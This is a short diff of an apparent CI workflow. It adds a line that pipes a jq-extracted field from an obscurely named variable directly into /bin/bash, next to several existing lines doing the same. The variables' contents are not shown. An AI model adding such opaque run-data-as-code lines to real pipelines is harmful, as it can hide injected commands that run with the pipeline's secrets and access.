@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$inzvk0" | jq -r .lhg992 | /bin/bash
           printf '%s' "$gej54" | jq -r .h17435 | /bin/bash
           printf '%s' "$ry5" | jq -r .ztrwd96779 | /bin/bash
+          echo $joyri7 | jq -r .mat155 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
